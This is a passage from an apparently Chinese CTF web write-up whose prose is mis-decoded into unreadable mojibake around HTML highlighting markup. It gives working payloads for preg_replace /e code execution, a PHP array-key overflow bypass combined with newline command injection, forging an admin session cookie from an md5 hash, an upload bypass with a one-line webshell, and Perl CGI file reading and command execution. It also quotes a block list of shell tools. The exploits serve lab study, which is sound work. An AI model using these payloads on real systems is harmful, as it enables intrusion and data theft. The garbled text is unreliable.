class="hljs-meta">?&gt;</span>    &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;    &lt;div style=<span class="hljs-string">&quot;text-align:center&quot;</span>&gt;        &lt;p class=&quot;lead&quot;&gt;&lt;?php echo $page; die();?&gt;&lt;/p&gt;    &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;<span class="hljs-meta">&lt;?php</span>&#125;<span class="hljs-keyword">else</span>&#123;<span class="hljs-meta">?&gt;</span>        &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;        &lt;div style=<span class="hljs-string">&quot;text-align:center&quot;</span>&gt;            &lt;p class=&quot;lead&quot;&gt;                <span class="hljs-meta">&lt;?php</span>                <span class="hljs-keyword">if</span> (strpos(<span class="hljs-variable">$page</span>, <span class="hljs-string">&#x27;input&#x27;</span>) &gt; <span class="hljs-number">0</span>) &#123;   <span class="hljs-comment">//è¿™é‡Œæ˜¯å¯¹å‡ ä¸ªå…³é”®è¯çš„è¿‡æ»¤ï¼Œæˆ‘ä»¬è¯»å–æºç æ—¶æ²¡æœ‰ç”¨åˆ°è¿™å‡ ä¸ªå…³é”®è¯æ‰€ä»¥æ²¡æœ‰å½±å“</span>                    <span class="hljs-keyword">die</span>();                &#125;                <span class="hljs-keyword">if</span> (strpos(<span class="hljs-variable">$page</span>, <span class="hljs-string">&#x27;ta:text&#x27;</span>) &gt; <span class="hljs-number">0</span>) &#123;                    <span class="hljs-keyword">die</span>();                &#125;                <span class="hljs-keyword">if</span> (strpos(<span class="hljs-variable">$page</span>, <span class="hljs-string">&#x27;text&#x27;</span>) &gt; <span class="hljs-number">0</span>) &#123;                    <span class="hljs-keyword">die</span>();                &#125;                <span class="hljs-keyword">if</span> (<span class="hljs-variable">$page</span> === <span class="hljs-string">&#x27;index.php&#x27;</span>) &#123;                    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Ok&#x27;</span>);                &#125;                    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$page</span>);                    <span class="hljs-keyword">die</span>();                <span class="hljs-meta">?&gt;</span>        &lt;/p&gt;        &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;<span class="hljs-meta">&lt;?php</span>&#125;&#125;<span class="hljs-comment">//æ–¹ä¾¿çš„å®ç°è¾“å…¥è¾“å‡ºçš„åŠŸèƒ½,æ­£åœ¨å¼€å‘ä¸­çš„åŠŸèƒ½ï¼Œåªèƒ½å†…éƒ¨äººå‘˜æµ‹è¯•</span><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>] === <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>) &#123; <span class="hljs-comment">//xxfå¤´</span>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br &gt;Welcome My Admin ! &lt;br &gt;&quot;</span>;          <span class="hljs-variable">$pattern</span> = <span class="hljs-variable">$_GET</span>[pat];  <span class="hljs-comment">//get æäº¤ä¸‰ä¸ªå‚æ•°</span>    <span class="hljs-variable">$replacement</span> = <span class="hljs-variable">$_GET</span>[rep];    <span class="hljs-variable">$subject</span> = <span class="hljs-variable">$_GET</span>[sub];    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$pattern</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$replacement</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$subject</span>)) &#123;        preg_replace(<span class="hljs-variable">$pattern</span>, <span class="hljs-variable">$replacement</span>, <span class="hljs-variable">$subject</span>);    &#125;<span class="hljs-keyword">else</span>&#123;        <span class="hljs-keyword">die</span>();    &#125;&#125;<span class="hljs-meta">?&gt;</span></code></pre><p>å‰é¢ä»£ç æ²¡æœ‰çªç ´ç‚¹ï¼Œç›´åˆ°çœ‹åˆ°<code>preg_replace</code></p><p><img src="https://i.loli.net/2020/12/02/4FfYrPBc1xE9Kzk.png" alt="preg_replace"></p><p>æ¼æ´</p><p>$pattern å­˜åœ¨ /e æ¨¡å¼ä¿®æ­£ç¬¦ï¼Œå…è®¸ä»£ç æ‰§è¡Œ</p><p>/e æ¨¡å¼ä¿®æ­£ç¬¦ï¼Œæ˜¯ *<em>preg_replace() *</em> å¯¼è‡´ $replacement éƒ¨åˆ†å½“åšphpä»£ç æ¥æ‰§è¡Œã€‚</p><p>æ‰€ä»¥å¯ä»¥æ„é€ å¦‚ä¸‹</p><p>payload</p><pre><code class="hljs sas">?pat=/test/e<span class="hljs-variable">&amp;rep</span><span class="hljs-meta">=system(</span><span class="hljs-string">&#x27;ls&#x27;</span>)<span class="hljs-variable">&amp;sub</span>=test?pat=/test/e<span class="hljs-variable">&amp;rep</span><span class="hljs-meta">=system(</span><span class="hljs-string">&#x27;ls s3chahahaDir/&#x27;</span>)<span class="hljs-variable">&amp;sub</span>=test?pat=/test/e<span class="hljs-variable">&amp;rep</span><span class="hljs-meta">=system(</span><span class="hljs-string">&#x27;ls s3chahahaDir/flag&#x27;</span>)<span class="hljs-variable">&amp;sub</span>=test?pat=/test/e<span class="hljs-variable">&amp;rep</span><span class="hljs-meta">=system(</span><span class="hljs-string">&#x27;cat s3chahahaDir/flag/flag.php&#x27;</span>)<span class="hljs-variable">&amp;sub</span>=test</code></pre><p>å‚è€ƒ:<a href="https://kevens10.github.io/articles/preg_replace()%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.html">https://kevens10.github.io/articles/preg_replace()%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.html</a> </p><h2 id="lottery"><a href="#lottery" class="headerlink" title="lottery"></a>lottery</h2><h3 id="0x1æ³¨å†Œç©ä¸€ä¸‹"><a href="#0x1æ³¨å†Œç©ä¸€ä¸‹" class="headerlink" title="0x1æ³¨å†Œç©ä¸€ä¸‹"></a>0x1æ³¨å†Œç©ä¸€ä¸‹</h3><p>â€‹        è¿›å…¥é¡µé¢å‘ä¸‹æ˜¯ä¸€ä¸ªä¹°å½©ç¥¨çš„ï¼Œå…ˆæ³¨å†Œä¸€ä¸ªè´¦å·ï¼Œåˆå§‹æœ‰20å—é’±ï¼Œè¦ä¹°flagï¼Œéœ€è¦99999999ï¼Œæ˜¾ç„¶ä¸å¯èƒ½</p><p>è¿˜æœ‰ä¸€ä¸ªä¹°å½©ç¥¨çš„åœ°æ–¹ï¼Œæ¯æ¬¡èŠ±2å—é’±ä¸¤ä¸ªå·ç å¯¹äº†å¥–åŠ±äº”å—ï¼Œè¿™äº›éƒ½ä¸é‡è¦ã€‚</p><p><img src="https://i.loli.net/2020/12/02/f2TOhKdw1Bo9QY6.png" alt="image-20201202220622597"></p><p>å¼€å§‹æ˜¯æƒ³ç€é€šè¿‡è„šæœ¬å¤šä¹°å‡ æ¬¡ï¼Œåæ¥å‘ç°ä¸å¯¹å•Šï¼Œæ¯æ¬¡éƒ½æ˜¯ä¹°å®Œäº†ä¹‹åä¸­å°†å·ç æ‰å…¬å¸ƒå‡ºæ¥ï¼Œè„šæœ¬å°±æ²¡æ„ä¹‰äº†ï¼Œæ‰€ä»¥è¿™ä¸ªæƒ³æ³•æ–­äº†ã€‚</p><p>äºæ˜¯å»çœ‹çœ‹äº†åˆ«çš„</p><h3 id="0x2-gitæºç æ³„éœ²"><a href="#0x2-gitæºç æ³„éœ²" class="headerlink" title="0x2 gitæºç æ³„éœ²"></a>0x2 gitæºç æ³„éœ²</h3><p>â€‹        ä¸‹è½½äº†å¥½å‡ ä¸ªæ–‡ä»¶ï¼Œçœ‹çœ‹äº†å…¶ä¸­æœ‰ç”¨çš„åªæœ‰<code>api.php</code>ï¼Œä»£ç å¤ªé•¿äº†ï¼Œå¤åˆ¶äº†é‡è¦çš„éƒ¨åˆ†</p><p>å®¡è®¡ä»£ç </p><pre><code class="hljs php"><span class="hljs-comment">//éšæœºç”Ÿæˆä¸­å°†å·ç </span><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">random_win_nums</span>(<span class="hljs-params"></span>)</span>&#123;<span class="hljs-variable">$result</span> = <span class="hljs-string">&#x27;&#x27;</span>;<span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$i</span>&lt;<span class="hljs-number">7</span>; <span class="hljs-variable">$i</span>++)&#123;<span class="hljs-variable">$result</span> .= random_num();  <span class="hljs-comment">//åˆ©ç”¨è‡ªå®šä¹‰çš„éšæœºå‡½æ•°ç”Ÿæˆéšæœºæ•°</span>&#125;<span class="hljs-keyword">return</span> <span class="hljs-variable">$result</span>;&#125;<span class="hljs-comment">//æ£€æµ‹æ˜¯å¦ä¸­å¥–ä»¥åŠ å¥–åŠ±å’Œæ‰£è´¹è§„åˆ™</span><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">buy</span>(<span class="hljs-params"><span class="hljs-variable">$req</span></span>)</span>&#123;require_registered();  <span class="hljs-comment">//æ£€æµ‹æ˜¯å¦æ³¨å†Œ</span>require_min_money(<span class="hljs-number">2</span>);  <span class="hljs-comment">//æ˜¯å¦æœ‰2å—é’±ä¹°å½©ç¥¨</span><span class="hljs-variable">$money</span> = <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;money&#x27;</span>];  <span class="hljs-comment">//ç”¨æˆ·çš„é’± </span><span class="hljs-variable">$numbers</span> = <span class="hljs-variable">$req</span>[<span class="hljs-string">&#x27;numbers&#x27;</span>];   <span class="hljs-comment">//ç”¨æˆ·ä¹°çš„å½©ç¥¨å·ç </span><span class="hljs-variable">$win_numbers</span> = random_win_nums();  <span class="hljs-comment">//ä¸­å¥–å·ç </span><span class="hljs-variable">$same_count</span> = <span class="hljs-number">0</span>;              <span class="hljs-comment">//è®°å½•æœ‰å‡ ä½ä¸­å¥–</span><span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$i</span>&lt;<span class="hljs-number">7</span>; <span class="hljs-variable">$i</span>++)&#123;   <span class="hljs-comment">// åˆ¤æ–­æœ‰å‡ ä½ä¸­å¥–</span><span class="hljs-keyword">if</span>(<span class="hljs-variable">$numbers</span>[<span class="hljs-variable">$i</span>] == <span class="hljs-variable">$win_numbers</span>[<span class="hljs-variable">$i</span>])&#123;  <span class="hljs-comment">//é‡ç‚¹æ¥äº†</span><span class="hljs-variable">$same_count</span>++;&#125;&#125;    <span class="hljs-keyword">switch</span> (<span class="hljs-variable">$same_count</span>) &#123;<span class="hljs-comment">//pass</span>&#125;<span class="hljs-variable">$money</span> += <span class="hljs-variable">$prize</span> - <span class="hljs-number">2</span>;<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;money&#x27;</span>] = <span class="hljs-variable">$money</span>;response([<span class="hljs-string">&#x27;status&#x27;</span>=&gt;<span class="hljs-string">&#x27;ok&#x27;</span>,<span class="hljs-string">&#x27;numbers&#x27;</span>=&gt;<span class="hljs-variable">$numbers</span>, <span class="hljs-string">&#x27;win_numbers&#x27;</span>=&gt;<span class="hljs-variable">$win_numbers</span>, <span class="hljs-string">&#x27;money&#x27;</span>=&gt;<span class="hljs-variable">$money</span>, <span class="hljs-string">&#x27;prize&#x27;</span>=&gt;<span class="hljs-variable">$prize</span>]);&#125;</code></pre><p>ä¸Šé¢çš„ä»£ç çœ‹ç€åƒæ˜¯æ²¡ä»€ä¹ˆé—®é¢˜ï¼Œä½†æ˜¯å¯¹<code>==</code>æ•æ„Ÿçš„ä¸€çœ¼å°±ä¼šå‘ç°è¿™é‡Œå­˜åœ¨é—®é¢˜</p><pre><code class="hljs php"><span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$i</span>&lt;<span class="hljs-number">7</span>; <span class="hljs-variable">$i</span>++)&#123;   <span class="hljs-comment">// åˆ¤æ–­æœ‰å‡ ä½ä¸­å¥–</span><span class="hljs-keyword">if</span>(<span class="hljs-variable">$numbers</span>[<span class="hljs-variable">$i</span>] == <span class="hljs-variable">$win_numbers</span>[<span class="hljs-variable">$i</span>])&#123;  <span class="hljs-comment">//é‡ç‚¹æ¥äº†</span><span class="hljs-variable">$same_count</span>++;&#125;&#125;</code></pre><p>è¿™é‡Œåˆ¤æ–­æ˜¯å¦ç›¸ç­‰å±…ç„¶ç”¨ <code>==</code>ï¼Œå°±å¾ˆç¦»è°±ï¼Œä¹Ÿæ˜¯çªç ´ç‚¹ï¼Œæµ‹è¯•æ•ˆæœå¦‚ä¸‹ </p><p><img src="https://i.loli.net/2020/12/02/EpgPnUsz1FBfq9k.png" alt="caipiao-1"></p><p>æ‰€ä»¥æ€è·¯å°±æ˜¯ï¼ŒæŠ“åŒ…ä¿®æ”¹æˆ‘ä»¬è¾“å…¥çš„å·ç éƒ½ä¸ºTrueï¼Œå°±è¡Œäº†ï¼Œä¸€æ¬¡ä¸­å¥–ä¸å¤Ÿå°±å¤šä¹°å‡ æ¬¡</p><p><strong>æ³¨æ„è¿™é‡Œä¸Šä¼ æ•°æ®æ—¶ä½¿ç”¨çš„æ˜¯jsonæ ¼å¼</strong>ï¼Œ<a href="https://www.runoob.com/json/js-json-arrays.html">jsonæ•°ç»„ç±»å‹</a></p><p><img src="https://i.loli.net/2020/12/02/qwTPDFZXuaSitR9.png" alt="image-20201202221043572"></p><p>ä¹‹åè¿”å›æµè§ˆå™¨ä¹°flagå³å¯</p><h2 id="favorite-number"><a href="#favorite-number" class="headerlink" title="favorite_number"></a>favorite_number</h2><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-comment">//php5.5.9</span><span class="hljs-variable">$stuff</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;stuff&quot;</span>];<span class="hljs-variable">$array</span> = [<span class="hljs-string">&#x27;admin&#x27;</span>, <span class="hljs-string">&#x27;user&#x27;</span>];<span class="hljs-keyword">if</span>(<span class="hljs-variable">$stuff</span> === <span class="hljs-variable">$array</span> &amp;&amp; <span class="hljs-variable">$stuff</span>[<span class="hljs-number">0</span>] != <span class="hljs-string">&#x27;admin&#x27;</span>) &#123;    <span class="hljs-variable">$num</span>= <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;num&quot;</span>];    <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&quot;/^\d+$/im&quot;</span>,<span class="hljs-variable">$num</span>))&#123;        <span class="hljs-keyword">if</span> (!preg_match(<span class="hljs-string">&quot;/sh|wget|nc|python|php|perl|\?|flag|&#125;|cat|echo|\*|\^|\]|\\\\|&#x27;|\&quot;|\|/i&quot;</span>,<span class="hljs-variable">$num</span>))&#123;            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;my favorite num is:&quot;</span>;            system(<span class="hljs-string">&quot;echo &quot;</span>.<span class="hljs-variable">$num</span>);        &#125;<span class="hljs-keyword">else</span>&#123;            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Bonjour!&#x27;</span>;        &#125;    &#125;&#125; <span class="hljs-keyword">else</span> &#123;    highlight_file(<span class="hljs-keyword">__FILE__</span>);&#125;</code></pre><h3 id="0x1ä»£ç å®¡è®¡"><a href="#0x1ä»£ç å®¡è®¡" class="headerlink" title="0x1ä»£ç å®¡è®¡"></a>0x1ä»£ç å®¡è®¡</h3><p>ä»£ç æ„æ€</p><blockquote><p>è¾“å…¥ä¸€ä¸ªæ•°ç»„stuff,stuffè¦å’Œarrayç›¸åŒï¼Œä½†æ˜¯$stuff[0] != â€˜adminâ€™</p><p>è¿™æ˜¯ä¸€ä¸ªçŸ›ç›¾çš„åˆ¤æ–­ï¼Œæ‰€ä»¥è¦æƒ³åŠæ³•ç»•è¿‡</p><p>ä¸‹é¢æ˜¯æäº¤ä¸€ä¸ªæ•°å­—ï¼Œé€šè¿‡åˆ¤æ–­åæ‰“å°å‡ºè¿™ä¸ªæ•°å­—å¹¶æ‰§è¡Œsystemå‡½æ•°</p><p>è¿™é‡Œä¸€å®šå­˜åœ¨å‘½ä»¤æ‰§è¡Œ</p></blockquote><p>é¢˜ç›®ç›´æ¥ç»™äº†æºç ï¼Œå¹¶ä¸”è¡¨æ˜äº†phpç‰ˆæœ¬ä¸º5.5.9ï¼Œé‚£å°±è¯´æ˜è¿™ä¸ªé¢˜ç›®ä¸€å®šå’Œè¿™ä¸ªç‰ˆæœ¬çš„æ¼æ´æœ‰å…³ï¼Œgoogleä¸€ä¸‹</p><p><a href="https://segmentfault.com/q/1010000003871264ï¼Œè¿™æ˜¯ä¸è¿™é¢˜å¾ˆåƒçš„ä¸€é¢˜">https://segmentfault.com/q/1010000003871264ï¼Œè¿™æ˜¯ä¸è¿™é¢˜å¾ˆåƒçš„ä¸€é¢˜</a></p><p>php5.5.9çš„æ•°ç»„çš„keyæº¢å‡ºæ¼æ´</p><p>ç»“åˆä¸Šé¢çš„é¢˜ç›®æ„é€ å‡ºpayload:</p><pre><code class="hljs apache"><span class="hljs-attribute">stuff</span>[<span class="hljs-number">4294967296</span>]=admin&amp;stuff[<span class="hljs-number">1</span>]=user&amp;num=<span class="hljs-number">123</span></code></pre><p>é¡µé¢æˆåŠŸæ‰“å°å‡ºäº†<code>my favorite num is:123</code>,è¯´æ˜å‰é¢å·²ç»ç»•è¿‡æˆåŠŸäº†</p><h3 id="0x2-ç»•è¿‡æ•°å­—ï¼Œå‘½ä»¤æ³¨å…¥"><a href="#0x2-ç»•è¿‡æ•°å­—ï¼Œå‘½ä»¤æ³¨å…¥" class="headerlink" title="0x2 ç»•è¿‡æ•°å­—ï¼Œå‘½ä»¤æ³¨å…¥"></a>0x2 ç»•è¿‡æ•°å­—ï¼Œå‘½ä»¤æ³¨å…¥</h3><p>å› ä¸ºæ­£åˆ™è¡¨è¾¾å¼æœ€åçš„må…è®¸å¤šè¡ŒåŒ¹é…ï¼Œæ‰€ä»¥è¿™é‡Œå¯ä»¥ä½¿ç”¨%0aç»•è¿‡æ•°å­—æ£€æµ‹</p><p>å¼€å§‹æ„é€ å‡ºçš„</p><pre><code class="hljs apache"><span class="hljs-attribute">stuff</span>[<span class="hljs-number">4294967296</span>]=admin&amp;stuff[<span class="hljs-number">1</span>]=user&amp;num=<span class="hljs-number">123</span>%<span class="hljs-number">0</span>als /</code></pre><p>æˆåŠŸåˆ—å‡ºäº†ç›®å½•ï¼Œçœ‹åˆ°äº†flagï¼Œä½†æ˜¯è¯»å–çš„æ—¶å€™å‘ç°flagå…³é”®è¢«è¿‡æ»¤äº†</p><p>æ‰€ä»¥ä¸å¾—ä¸æ¢ä¸€ç§æ–¹æ³•</p><pre><code class="hljs routeros">ls -i<span class="hljs-comment"># åˆ—å‡ºå½“å‰â½‚ä»¶åˆ—è¡¨ï¼Œå–å‡ºinode</span><span class="hljs-comment"># findæ‰¾åˆ°å¯¹åº”inodeçš„â½‚ä»¶</span><span class="hljs-builtin-name">find</span> / -inum<span class="hljs-comment"># moreè¯»å–å¯¹åº”çš„æ–‡ä»¶</span>more `<span class="hljs-builtin-name">find</span> / -inum `</code></pre><p><img src="https://i.loli.net/2020/12/03/84FbyGXJTK157LA.png" alt="find"></p><p>æ‰€ä»¥æœ€åçš„payload:</p><pre><code class="hljs apache"><span class="hljs-attribute">stuff</span>[<span class="hljs-number">4294967296</span>]=admin&amp;stuff[<span class="hljs-number">1</span>]=user&amp;num=<span class="hljs-number">111</span>%<span class="hljs-number">0</span>amore `find / -inum <span class="hljs-number">38667190</span>`</code></pre><p><img src="https://i.loli.net/2020/12/03/cesVHi2EJPogUq9.png" alt="more"></p><p>å‚è€ƒï¼š</p><blockquote><p><a href="https://www.coodesker.com/">https://www.coodesker.com/</a></p><p><a href="https://blog.csdn.net/weixin_44604541/article/details/109365511">https://blog.csdn.net/weixin_44604541/article/details/109365511</a></p></blockquote><h2 id="bug"><a href="#bug" class="headerlink" title="bug"></a>bug</h2><h3 id="0x1è·å¾—adminæƒé™"><a href="#0x1è·å¾—adminæƒé™" class="headerlink" title="0x1è·å¾—adminæƒé™"></a>0x1è·å¾—adminæƒé™</h3><p>å…ˆæ³¨å†Œç™»å½•çœ‹çœ‹ï¼Œé¡µé¢åŠŸèƒ½å¾ˆç®€å•ï¼Œå½“ç‚¹å‡»manageæ—¶ï¼Œæç¤ºéœ€è¦adminè´¦å·æ‰å¯ä»¥ï¼Œæ‰€ä»¥æ¥ä¸‹æ¥å°±è¦æƒ³åŠæ³•æ‹¿åˆ°adminè´¦å·</p><p>åœ¨æ³¨å†Œçš„æ—¶å€™æœ‰ä¸€ä¸ªæ‰¾å›å¯†ç çš„åŠŸèƒ½ï¼Œå½“æˆ‘ä»¬ç‚¹è¿›å»çš„æ—¶å€™å¯ä»¥çœ‹åˆ°ï¼Œä¿®æ”¹å¯†ç åªéœ€è¦ç”Ÿæ—¥å’Œåœ°å€</p><p><img src="https://i.loli.net/2020/12/04/gMlj3mK1dIGViZS.png" alt="image-20201204130616230"></p><p>è¿™å°±æƒ³åˆ°äº†åˆšæ‰ç™»å½•é¡µé¢æ˜¾ç¤ºçš„ä¸ªäººä¿¡æ¯ï¼Œé‚£ä¹ˆæ€ä¹ˆæ‰èƒ½æ‹¿åˆ°adminçš„ä¸ªäººä¿¡æ¯å°±æ˜¯ä¸€ä¸ªé—®é¢˜</p><p>ä¸å¦¨å…ˆæŠ“åŒ…çœ‹ä¸€ä¸‹ï¼Œå¯ä»¥çœ‹åˆ°cookieä¸­æœ‰ä¸€ä¸ªuserï¼Œè¿™ä¸ªå€¼åƒæ˜¯md5ï¼Œåœ¨çº¿è§£å¯†ä¸€ä¸‹</p><p><img src="https://i.loli.net/2020/12/04/Mok5CT4UrhnfQRE.png" alt="image-20201204125903267"></p><pre><code class="hljs apache"><span class="hljs-attribute">82ed7a14920dd2db1b6657348656eaa5</span><span class="hljs-attribute">7</span>:<span class="hljs-number">123</span></code></pre><p>ä¹Ÿå°±æ˜¯uid+usernameçš„md5å€¼ï¼Œé‚£æˆ‘ä»¬æ˜¯ä¸æ˜¯å¯ä»¥ä¼ªé€ ä¸€ä¸ªè¿™æ ·çš„cookieç„¶ååˆ°ä¸ªäººä¿¡æ¯çš„é¡µé¢æäº¤è·å–ä¿¡æ¯</p><pre><code class="hljs apache"><span class="hljs-attribute">md5</span>(<span class="hljs-number">1</span>:amdin)=<span class="hljs-number">4</span>b<span class="hljs-number">9987</span>ccafacb<span class="hljs-number">8</span>d<span class="hljs-number">8</span>fc<span class="hljs-number">08</span>d<span class="hljs-number">22</span>bbca<span class="hljs-number">797</span>ba</code></pre><p><img src="https://i.loli.net/2020/12/04/hmOfpoeK4s2jyvZ.png" alt="bug-1"></p><p>è¿™æ ·å°±è·å–äº†ä¿¡æ¯ï¼Œå†å»ä¿®æ”¹å¯†ç ç™»å½•</p><h3 id="0x2ä¸Šä¼ ç»•è¿‡"><a href="#0x2ä¸Šä¼ ç»•è¿‡" class="headerlink" title="0x2ä¸Šä¼ ç»•è¿‡"></a>0x2ä¸Šä¼ ç»•è¿‡</h3><p>ç™»å½•åç‚¹å‡»manageæç¤ºéæ³•IPï¼Œç›´æ¥æŠ“åŒ…æ·»åŠ xxfï¼Œå¾—åˆ°æç¤º</p><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- index.php?module=filemanage&amp;do=???--&gt;</span></code></pre><p>è®¿é—®ä¸€ä¸‹ä¸Šé¢çš„åœ°å€ä¸€å¼€å§‹ä»¥ä¸ºdoæ˜¯submitï¼Œä½†æ˜¯æäº¤æ²¡ååº”ï¼Œåˆæ”¹æˆäº†uploadï¼Œè¿™æ ·å°±å¯¹äº†ï¼Œå‡ºæ¥ä¸€ä¸ªä¸Šä¼ å›¾ç‰‡çš„ç½‘é¡µ</p><p>ä¸Šä¼ phpæ–‡ä»¶ï¼Œå‡ºç°å‰ç«¯æ£€æµ‹æç¤º</p><p>é‚£å°±ç›´æ¥æŠ“åŒ…ï¼ŒæŠŠphpæ”¹æˆphp5ä¿®æ”¹äº†MIMEä¸ºimage/jpegï¼Œä½†æ˜¯è¿˜æ˜¯æç¤ºå¯ä»¥çœ‹å‡ºæ¥æ˜¯ä¸€ä¸ªphpæ–‡ä»¶ï¼Œå¯èƒ½æ£€æµ‹äº†æ–‡ä»¶å¼€å¤´ä¿¡æ¯ï¼Œé‚£å°±æ”¹æˆä¸‹é¢æ ¼å¼çš„ä¸€å¥è¯æœ¨é©¬</p><p>è·å¾—äº†flag</p><p><img src="https://i.loli.net/2020/12/04/Nos2ZmYglFMIcLx.png" alt="image-20201204132940298"></p><h2 id="i-got-id-200"><a href="#i-got-id-200" class="headerlink" title="i-got-id-200"></a>i-got-id-200</h2><p>é¢˜ç›®ç»™äº†ä¸‰ä¸ªé¡µé¢ï¼Œå…¶ä¸­æœ‰ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ çš„é¡µé¢ï¼Œéšä¾¿ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶å¯ä»¥å‘ç°ä¼šå°†æ–‡ä»¶çš„å†…å®¹æ˜¾ç¤ºå‡ºæ¥ï¼ŒçŒœæµ‹è¿™é‡Œä½¿ç”¨äº†param()å‡½æ•°</p><p><strong>param()å‡½æ•°ä¼šè¿”å›ä¸€ä¸ªåˆ—è¡¨çš„æ–‡ä»¶ä½†æ˜¯åªæœ‰ç¬¬ä¸€ä¸ªæ–‡ä»¶ä¼šè¢«æ”¾å…¥åˆ°ä¸‹é¢çš„æ¥æ”¶å˜é‡ä¸­ã€‚å¦‚æœæˆ‘ä»¬ä¼ å…¥ä¸€ä¸ªARGVçš„æ–‡ä»¶ï¼Œé‚£ä¹ˆPerlä¼šå°†ä¼ å…¥çš„å‚æ•°ä½œä¸ºæ–‡ä»¶åè¯»å‡ºæ¥ã€‚å¯¹æ­£å¸¸çš„ä¸Šä¼ æ–‡ä»¶è¿›è¡Œä¿®æ”¹,å¯ä»¥è¾¾åˆ°è¯»å–ä»»æ„æ–‡ä»¶çš„ç›®çš„</strong></p><p>ç»™äº†æç¤º<code>Perl File Upload</code>ç¬¬ä¸€æ¬¡è§è¿™ä¸ªä¸œè¥¿ï¼Œåœ¨ç½‘ä¸Šå­¦ä¹ äº†ä¸€ä¸‹</p><p>å¤§ä½¬çŒœæµ‹å‡ºçš„åå¤©æºç </p><pre><code class="hljs php"><span class="hljs-keyword">use</span> <span class="hljs-title">strict</span>;<span class="hljs-keyword">use</span> <span class="hljs-title">warning</span>;<span class="hljs-keyword">use</span> <span class="hljs-title">CGI</span>;my <span class="hljs-variable">$cgi</span>=CGI-&gt;new;<span class="hljs-keyword">if</span>(<span class="hljs-variable">$cgi</span>-&gt;upload(<span class="hljs-string">&#x27;file&#x27;</span>))&#123;my <span class="hljs-variable">$file</span>=<span class="hljs-variable">$cgi</span>-&gt;param(<span class="hljs-string">&#x27;$file&#x27;</span>);<span class="hljs-keyword">while</span>(&lt;<span class="hljs-variable">$file</span>&gt;) &#123;<span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;<span class="hljs-subst">$_</span>&quot;</span>);&#125;&#125;</code></pre><p>   1.æŠ“åŒ…ä¿®æ”¹urlå’Œä¸Šä¼ å†…å®¹ï¼Œä¿®æ”¹æˆå¦‚å›¾æ‰€ç¤º</p><p><img src="https://i.loli.net/2020/12/09/UdBY7aruk2JhXim.png" alt="image-20201209092628853"></p><p><img src="https://i.loli.net/2020/12/09/n6DmvYEfM8HeI4h.png" alt="image-20201209091529965"></p><ol start="2"><li><p>å…ˆè¯»å–file.plæ–‡ä»¶ï¼Œç›²çŒœåœ¨/var/www/cgi-bin/file.plï¼Œå°†3éƒ¨åˆ†payloadä¿®æ”¹ ä¸ºï¼š/cgiÂ­bin/file.pl?/var/www/cgi-bin/file.pl </p></li><li><p>åˆ©ç”¨bashæ¥è¿›è¡Œè¯»å–å½“å‰ç›®å½•ä¸‹çš„æ–‡ä»¶ï¼Œå°†3éƒ¨åˆ†payloadä¿®æ”¹ä¸ºï¼š/cgibin/file.pl?/bin/bash%20Â­c%20ls${IFS}/| </p><p><img src="https://i.loli.net/2020/12/09/7g6WiKyzYG5vQsd.png" alt="image-20201209093015408"></p></li><li><p>è¯»å–å½“å‰ç›®å½•çš„flagæ–‡ä»¶å†…å®¹,å°†3éƒ¨åˆ†payloadä¿®æ”¹ä¸ºï¼š/cgiÂ­bin/file.pl?/flag</p></li></ol><p><img src="https://i.loli.net/2020/12/09/n7xUhu69oBfGwaM.png" alt="image-20201209092658534"></p><p><a href="https://adworld.xctf.org.cn/task/writeup?type=web&id=5001&number=3&grade=1&page=2">å‚è€ƒ</a></p><h2 id="Web-php-wrong-nginx-config"><a href="#Web-php-wrong-nginx-config" class="headerlink" title="Web_php_wrong_nginx_config"></a>Web_php_wrong_nginx_config</h2><h3 id="0x1ä¿¡æ¯æ”¶é›†"><a href="#0x1ä¿¡æ¯æ”¶é›†" class="headerlink" title="0x1ä¿¡æ¯æ”¶é›†"></a>0x1ä¿¡æ¯æ”¶é›†</h3><p>è¿›å…¥é¡µé¢å‘ç°è¦ç™»å½•ï¼Œä½†æ˜¯æ²¡æœ‰è´¦å·ï¼Œæ‰«æç›®å½•ä¹Ÿæ²¡å‘ç°æ³¨å†Œè´¦å·çš„é¡µé¢ï¼Œä½†æ˜¯å‘ç°äº†robots.txtï¼Œå…¶ä¸­ç»™äº†hint.phpå’Œhack.php</p><p>hint.php</p><pre><code class="hljs awk">é…ç½®æ–‡ä»¶ä¹Ÿè®¸æœ‰é—®é¢˜å‘€ï¼š<span class="hljs-regexp">/etc/</span>nginx<span 